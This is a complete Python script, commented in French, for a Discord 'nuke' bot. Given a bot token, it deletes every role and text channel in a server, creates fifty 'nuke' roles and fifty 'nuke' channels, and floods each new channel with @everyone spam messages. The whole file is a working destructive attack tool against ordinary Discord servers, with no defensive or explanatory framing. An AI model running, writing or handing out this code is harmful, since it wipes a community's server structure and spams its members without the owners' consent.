import discord
import asyncio

# Fonction pour obtenir le token du bot
def get_bot_token():
    token = input("Enter your Discord bot token: ")
    return token.strip()

# Fonction pour supprimer tous les rôles dans la guilde
async def delete_all_roles(guild):
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(f"Deleted role '{role.name}'")
            except discord.Forbidden:
                print(f"Bot does not have permission to delete role '{role.name}'")

# Fonction pour créer des rôles
async def create_nuke_roles(guild):
    for i in range(50):
        await guild.create_role(name=f"nuke-{i+1}")
        print(f"Created role 'nuke-{i+1}'")

# Fonction pour supprimer tous les canaux texte dans la guilde
async def delete_all_channels(guild):
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            await channel.delete()
            print(f"Deleted channel '{channel.name}'")

# Fonction pour créer des canaux et envoyer un message personnalisé
async def create_nuke_channels(guild, custom_message):
    for i in range(50):
        channel = await guild.create_text_channel(f"nuke-{i+1}")
        print(f"Created channel 'nuke-{i+1}'")
        for _ in range(10):
            message = f"{custom_message} @everyone"
            await channel.send(message)
            print(f"Sent message to channel 'nuke-{i+1}'")

# Fonction principale
async def main():
    bot_token = get_bot_token()  # Appel synchrone pour obtenir le token
    intents = discord.Intents.default()
    intents.guilds = True
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'We have logged in as {client.user}')
        print('Type "y" to nuke.')
        print('Type "m" to nuke with a custom message.')

        user_input = input("Your choice: ")  # Appel synchrone pour obtenir l'input
        if user_input.lower() == 'y':
            custom_message = ""
        elif user_input.lower() == 'm':
            custom_message = input("Enter your custom message: ")

        if user_input.lower() in ['y', 'm']:
            guild = client.guilds[0]  # Assuming the bot is only in one guild
            await delete_all_roles(guild)
            await create_nuke_roles(guild)
            await delete_all_channels(guild)
            await create_nuke_channels(guild, custom_message)
            print("All operations executed successfully!")

    await client.start(bot_token)

if __name__ == "__main__":
    asyncio.run(main())
